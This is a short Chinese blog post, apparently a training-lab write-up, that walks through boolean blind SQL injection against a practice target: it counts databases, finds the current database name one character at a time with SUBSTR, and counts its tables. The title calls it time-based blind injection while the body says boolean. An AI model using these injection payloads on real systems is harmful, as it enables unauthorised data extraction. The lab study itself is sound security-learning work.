---
layout: post
title: 掌控安全 SQL 注入靶场练习 - 时间盲注
categories: [安全, SQL注入]
description: 掌控安全 SQL 注入靶场练习 - 时间盲注
keywords: SQL注入, SQLMAP
---

# 掌控安全 SQL 注入靶场练习 - 布尔盲注

## 0x01 数据库探测

### 0x01.1 数据库数量探测
```sql
-- 数据库数量探测

http://injectx1.lab.aqlab.cn:81/Pass-10/index.php?id=1  AND (SELECT COUNT(*) FROM information_schema.SCHEMATA)=6

```

![boolblind-database-number-detect.png](/images/2020/12/09/boolblind-database-number-detect.png)

### 0x01.2 当前数据库名称探测

1. 探测当前数据库长度

```sql
SELECT LENGTH( (SELECT database()) );
-- result: 4
```

> 数据库名长度: 4

2. 使用 SUBSTR 探测数据库字符

开启是 **4个并发** 探测。 因为数据库名长度只有 **4** 。 之前探测结果。

```sql
-- 1.
SELECT 'z'=( SELECT SUBSTR((SELECT DATABASE()),1,1))
-- 2.
SELECT 'k'=( SELECT SUBSTR((SELECT DATABASE()),2,1))
-- 3.
SELECT 'a'=( SELECT SUBSTR((SELECT DATABASE()),3,1))
-- 4.
SELECT 'q'=( SELECT SUBSTR((SELECT DATABASE()),4,1))

-- reuslt: 1 or 0 
```

3. 组合数据库名字字符串

> 库名: zkaq

## 0x02 表探测

### 0x02.1 探测当前数据库表数量

```sql
SELECT COUNT(*) FROM information_schema.`TABLES` WHERE TABLE_SCHEMA=database();

-- result: 1
```

## 0xGG 参考文章

+ [SQL布尔型盲注思路分析（入门必看）](https://blog.csdn.net/qq_35544379/article/details/77351783)

